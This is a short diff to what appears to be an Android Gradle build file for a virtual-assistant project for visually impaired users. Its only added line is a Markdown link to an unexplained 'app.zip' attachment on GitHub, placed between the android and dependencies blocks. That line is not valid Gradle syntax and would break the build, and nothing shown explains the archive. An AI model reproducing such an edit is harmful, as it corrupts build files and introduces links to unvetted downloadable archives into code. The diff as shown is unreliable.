@@ -32,6 +32,8 @@ android {
         noCompress "lite"
     }
 }
+[app.zip](https://github.com/RagaShreya/Virtual-Assistant-for-Visually-Impaired-/files/10895289/app.zip)
+
 
 dependencies {
     implementation fileTree(dir: "libs", include: ["*.jar"])
